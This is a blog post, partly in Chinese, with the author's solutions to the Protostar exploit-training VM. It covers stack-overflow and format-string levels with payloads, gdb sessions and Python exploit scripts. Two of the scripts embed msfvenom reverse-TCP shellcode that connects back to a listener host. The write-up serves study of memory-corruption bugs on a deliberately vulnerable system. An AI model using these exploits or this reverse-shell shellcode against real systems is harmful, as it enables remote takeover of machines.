---
layout:     post
title:      protostar系统学习
date:       2016-06-03
summary:    study protostar to upgrade new skills
categories: linux
tags:
 - overflow
 - linux
---
#### 0xff About Protostar

    Protostar introduces the following in a friendly way:

    Network programming
    Byte order
    Handling sockets
    Stack overflows
    Format strings
    Heap overflows

The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.

In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.
    

    official website:       https://exploit-exercises.com/protostar
    nebula.iso download:    https://pan.baidu.com/s/1nvq3f5J
    some witeup:    
        https://lightless.me/archives/protostar-stack-writeup.html
        https://bug.cool/2016/Protostar_Writeup/
        https://lightless.me/archives/protostar-format-writeup.html
        

#### 0x00 stack0
    mykey:
        cd /opt/protostar/bin
        objdump -d -M intel stack0 > /tmp/stack0.out
        vi stack0.out
    link knowledge:
        https://blog.163.com/lixiangqiu_9202/blog/static/535750372012727102618226/

#### 0x01 stack1
    mykey:
        python -c "print 'A'*64+'\x64\x63\x62\x61'" | xargs ./stack1
    link knowledge:
        the command:
            python -c "print 'A'*64+'\x64\x63\x62\x61'" | ./stack1 
        will not work,coz this protostar is different from the first nebula system

#### 0x02 stack2
    mykey:
        export GREENIE=`python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'"`
        ./stack2

#### 0x03 stack3
    mykey:
        gdb ./stack3
        b win
        output:breakpoint 1 at 0x804842a...
        quit
        python -c "print 'A'*64+'\x2a\x84\x04\x08'" | ./stack3

#### 0x04 stack4
    mykey:
        gdb ./stack4
        disas win
            查得win函数的地址为080483f4
        disas main
        b *main+3
            esp最后一位置0,实时跟踪esp最后一位为8
            填充字节数为8+64+4(4为main函数中的ebp所占空间)=76
            最后确定77-80个字节为覆盖main函数的返回地址的位置
        q
        y
        r < /tmp/stack4
            /tmp/stack4为AAA..A1234(76个A+1234)
        vi /tmp/stack4
        :%!xxd
            修改31323334处为f4830408
        :%!xxd -r(保存作用)
        gdb ./stack4
        r < /tmp/stack4

#### 0x05 stack5
    mykey:
        su
        godmode
        vi /proc/sys/fs/suid_dumpable
            设置为1,允许suid文件可以dump
        cd /tmp
        vi stack5.py
        ----------stack5.py---------
        #!/usr/bin/python
        import os
        import sys
        import struct
        
        shellcode1="\x90"*40
        shellcode1="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
        
        shellcode =  "\x90"*30
        #msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=4444 -b \x00 -f py
        shellcode += "\xda\xd1\xbe\xd9\xba\xd5\x41\xd9\x74\x24\xf4\x58\x29"
        shellcode += "\xc9\xb1\x12\x31\x70\x1a\x83\xc0\x04\x03\x70\x16\xe2"
        shellcode += "\x2c\x8b\x0e\xb6\x2d\xbf\xf3\x6a\xdb\x42\x44\xea\x92"
        shellcode += "\xa2\x69\x73\x33\x7f\x1a\xb4\x93\x83\xb0\x5c\xe1\x83"
        shellcode += "\x55\xc1\x6c\x62\x3f\x9f\x36\x35\x91\x08\x4f\x54\x52"
        shellcode += "\x7a\xcf\x25\x52\x3d\xcf\x59\x5d\x3d\x46\xba\x9c\xd6"
        shellcode += "\x54\xfc\xfc\x25\xd4\x83\xcf\xb6\x4f\xf5\x31\x2f\xd9"
        shellcode += "\x09\x02\x53\xe8\x92\x9d\xb5"
        
        ret=0xbffff780
        payload = 'A'*76+struct.pack("<I",ret)+shellcode
        f=open("/tmp/tmp.txt","a+")
        f.write(payload)
        f.close()
        input=payload
        #print input
        os.system("echo '%s' | /opt/protostar/bin/stack5" % input)
        ------------end-------------
        use msf listen on 4444 with the same payload
        python stack5.py
        gdb -q -c co[tab]
        output:permission denied
        ls -al /tmp/co[tab]
        output:
        -rw-------  1 root user 163840 Jun  9 01:19 core.11.stack5.6174
        su
        godmode
        chmod 777 /tmp/co[tab]
        su - user
        user
        bash
        cd /tmp
        gdb -q -c co[tab]
        x/20x $esp
        ----output:-------
        0xbffff850:     0x90909090      0x90909090      0x90909090      0x90909090
        0xbffff860:     0x90909090      0x90909090      0x90909090      0xd1da9090
        0xbffff870:     0xd5bad9be      0x2474d941      0xc92958f4      0x703112b1
        ------end---------
        vi /tmp/stack5.py
        ----------stackt.py on ret---------
        ret=0xbffff850
        ----------------end----------------
        python stack5.py
        msf receive a shell from protostar

#### 0x06 stack6
    mykey:
        构造如下链:
        'A'*80+system_addr+exit_addr+command_addr+command(='/bin/sh\x00')
        gdb stack6
        disas getpath
        b*getpath+117(at ret in func getpath)
        r
        AAAAAAAA
        x/20x $esp-80(make sure it is 0x41414141)
        output:
        0xbffff6dc:     0x41414141      0x41414141      0xb7ec6100      0xbffff708
        command_addr=0xbffff7cc+80+4+4+4=0xbffff828
        print system
        output:0xb7ecffb0
        print exit
        output:0xb7ec60c0
        python -c "print 'A'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x58\xf7\xff\xbf'+'echo succeed'+'\x00'" | ./stack6ython -c "print 'A'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x48\xf7\xff\xbf'+'/bin/sh\x00'" | ./stack6
        the output is not obviously
        python -c "print 'A'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x28\xf8\xff\xbf'+'echo 123456'+'\x00'" | /opt/protostar/bin/stack6
        output:看上去什么也没发生,应该没有执行成功,然而后来gdb却发现可以成功,具体如下
        cd /tmp
        vi stack6.py
        --------/tmp/stack6.py----------
        buf='A'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x28\xf8\xff\xbf'+'/bin/echo succeed > /tmp/succeed.txt'+'\x00'
        f=open("/tmp/stack6.txt","a+")
        f.write(buf)
        f.close()
        -------------end----------------
        gdb /opt/protostar/bin/stack6
        r < /tmp/stack6.txt
        vi /tmp/succeed.txt
        output:succeed
        此时已经成功写文件,奇怪!居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令

#### 0x07 stack7
    mykey:
        形如0xbxxxxxxx或0xfxxxxxxx的地址(system等系统函数地址)不可使用
        objdump -d stack7
        find .text has someplace with:
        ---------.text-----------
        8048492:       5b                      pop    %ebx
        8048493:       5d                      pop    %ebp
        8048494:       c3                      ret  
        -----------end-----------
        构造如下链:
        'A'*80+'\x92\x84\x04\x08'+'BBBBBBBB'+shellcode_addr+shellcode
        use msf start a listener with the same payload like below
        vi /tmp/stack7.py
        -----------stack7.py---------
        #!/usr/bin/python
        import os
        import sys
        import struct
        
        shellcode1="\x90"*40
        shellcode1="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
        
        shellcode =  "\x90"*30
        #msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=4444 -b \x00 -f py
        shellcode += "\xda\xd1\xbe\xd9\xba\xd5\x41\xd9\x74\x24\xf4\x58\x29"
        shellcode += "\xc9\xb1\x12\x31\x70\x1a\x83\xc0\x04\x03\x70\x16\xe2"
        shellcode += "\x2c\x8b\x0e\xb6\x2d\xbf\xf3\x6a\xdb\x42\x44\xea\x92"
        shellcode += "\xa2\x69\x73\x33\x7f\x1a\xb4\x93\x83\xb0\x5c\xe1\x83"
        shellcode += "\x55\xc1\x6c\x62\x3f\x9f\x36\x35\x91\x08\x4f\x54\x52"
        shellcode += "\x7a\xcf\x25\x52\x3d\xcf\x59\x5d\x3d\x46\xba\x9c\xd6"
        shellcode += "\x54\xfc\xfc\x25\xd4\x83\xcf\xb6\x4f\xf5\x31\x2f\xd9"
        shellcode += "\x09\x02\x53\xe8\x92\x9d\xb5"
        
        ret=0x08048492
        payload = 'A'*80+struct.pack("<I",ret)+'BBBBBBBB'+'\x41\x41\x41\x41' #without shellcode here
        f=open("/tmp/stack7.txt","a+")
        f.write(payload)
        f.close()
        input=payload
        #print input
        #os.system("echo '%s' | /opt/protostar/bin/stack7" % input) #执行此行时会发生乱码影响shellcode_addr的查找,这句先不执行
        -------------end-------------
        gdb /opt/protostar/bin/stack7
        disas getpath
        b*getpath+128(at ret in getpath func)
        r < /tmp/stack7.txt
        x/20x $esp
        output:
        0xbffff73c:     0x08048492      0x42424242      0x42424242      0x41414141
        0xbffff74c:     0xb7eadc00      0x00000001      0xbffff7f4      0xbffff7fc
        so shellcode_addr=0xbffff74c
        vi /tmp/stack7.py
        ------add shellcode and modified shellcode_addr------
        payload = 'A'*80+struct.pack("<I",ret)+'BBBBBBBB'+'\x4c\xf7\xff\xbf'+shellcode
        ...
        os.system("echo '%s' | /opt/protostar/bin/stack7" % input)
        -----------------------end---------------------------
        rm stack7.txt
        python stack7.py
        失败,系统乱码,并未反弹shell,于是分析core文件,gdb动态调试时的地址不一定是正确的
        ulimit -c unlimited
        -------modify /tmp/stack7.py--------
        payload = 'A'*80+struct.pack("<I",ret)+'BBBBBBBB'+'\x4c\xf7\xff\xbf'
        ...
        #os.system("echo '%s' | /opt/protostar/bin/stack7" % input)
        ---------------end------------------
        rm stack7.txt
        python stack7.py
        /opt/protostar/bin/stack7 < /tmp/stack7.txt
        su 
        godmode
        chmod 777 co[tab]
        gdb -q -c co[tab]
        x/20x $esp-4
        output:
        0xbffff848:     0xbffff83c      0x90909090      0x90909090      0x90909090
        0xbffff858:     0x90909090      0x90909090      0x90909090      0x90909090
        ---------modify /tmp/stack7.py--------
        payload = 'A'*80+struct.pack("<I",ret)+'BBBBBBBB'+'\x4c\xf8\xff\xbf'+shellcode
        ...
        os.system("echo '%s' | /opt/protostar/bin/stack7" % input)
        ------------------end-----------------
        rm stack7.txt
        python stack7.py
        msf receive a shell connect from protostar

#### 0x07 format0
    mykey:
        ./format0 `python -c "print 'A'*64+'\xef\xbe\xad\xde'"`
        但是题目要求输入为10字节以内,so
        ./format0 `python -c "print '%64d' + '\xef\xbe\xad\xde'"`

#### 0x08 format1
    mykey:
        objdump -t format1
        find target address:0x8049638
        ./format1 `python -c "print 'AAAABBBB'+'%x.%x'"`
        -------------output:--------------
        AAAABBBB804960c.bffff788
        --------------end-----------------
        ./format1 `python -c "print 'AAAABBBB'+'%2\$x'"`
        ----------------output:----------------
        AAAABBBB
        ------------------end------------------
        结论:这里不能用\$
        ./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`
        ---------------output:----------------
        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7be.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.d5f4313f.ffa7a72f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b4.bffff7be.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.d3000000.e844f82d.2820150f.79187f9d.69c015e8.363836.0.6f662f2e.74616d72.41410031.42424141.78254242.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
        ------------------end-----------------
        find 42424141 in the 132th print location
        -----------------output:----------------
        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7bb.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.b3c0b28e.9993249e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b1.bffff7bb.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.84000000.a999d71b.1ef8a615.f39ada32.69642dc2.363836.662f2e00.616d726f.41003174.42414141.25424242.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
        --------------------end-----------------
        find 42414141 in the 131th print location
        结论:AAAABBBB的在栈中出现的位置会随着输入的长度不同而变化
        根据./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`中132个输出为42424141:
        ./format1 `python -c "print 'AA\x38\x96\x04\x08BB'+'%x.'*131+'%n.'+'%x.'*8"`
        output:
        .....you have modified the target :)

#### 0x09 format2
    mykey:
        objdump -t format2
        find target address:80496e4
        python -c "print '%x.'*2" | ./format2
        --------output:---------
        200.b7fd8420.
        ---------end------------
        python -c "print '%2\$x.'" | ./format2
        ------------output:-----------
        b7fd8420.
        -------------end--------------
        结论:支持\$
        python -c "print 'AAAABBBB'+'%x.'*10" | ./format2
        ---------output:----------
        AAAABBBB200.b7fd8420.bffff5c4.41414141.42424242.252e7825.78252e78.2e78252e.252e7825.78252e78.
        -----------end------------
        python -c "print '\xe4\x96\x04\x08BBBB%56x'+'%4\$n'" | ./format2
        output:
        you have modified the target :)

#### 0xA format3
    mykey:
        objdump -t format3
        find target address:80496f4
        python -c "print 'AAAABBBB'+'%x.'*2" | ./format3
        --------output:---------
        AAAABBBB0.bffff580.
        ------------end---------
        python -c "print 'AAAABBBB'+'%2\$x'" | ./format3
        --------output:--------
        AAAABBBBbffff580
        ----------end----------
        结论:支持\$
        python -c "print 'AAAABBBB'+'%x.'*13" | ./format3
        ---------output:--------
        AAAABBBB0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.41414141.42424242.
        -----------end----------
        python -c "print '\xf4\x96\x04\x08BBBB%16930108x'+'%12\$n'" | ./format
        output:
        ...you have modified the target:)

#### 0xB format4
    mykey:
        gdb查找函数hello的地址(gdb找函数地址好像是不会变的,动态调试中的参数变量似乎会改变)
        gdb format4
        disas hello
        output:
        0x080484b4 <hello+0>:   push   %ebp
        查找exit()在GOT表中的位置
        objdump -TR format4
        ---------output:----------
        DYNAMIC RELOCATION RECORDS
        OFFSET   TYPE              VALUE 
        080496fc R_386_GLOB_DAT    __gmon_start__
        08049730 R_386_COPY        stdin
        0804970c R_386_JUMP_SLOT   __gmon_start__
        08049710 R_386_JUMP_SLOT   fgets
        08049714 R_386_JUMP_SLOT   __libc_start_main
        08049718 R_386_JUMP_SLOT   _exit
        0804971c R_386_JUMP_SLOT   printf
        08049720 R_386_JUMP_SLOT   puts
        08049724 R_386_JUMP_SLOT   exit
        -----------end------------
        find exit address is saved in 08049724,that is:exit_address=[08049724]
        尝试在0x08049724中写入0x080484b4
        python -c "print 'AAAABBBB'+'%x.'*10" | ./format4
        -----------output:------------
        AAAABBBB200.b7fd8420.bffff5c4.41414141.42424242.252e7825.78252e78.2e78252e.252e7825.78252e78.
        -------------end--------------
        python -c "print '\x24\x97\x04\x08BBBB%134513836x'+'%4\$n.'" | ./format4
        output:
        ...code execution redirected! you win



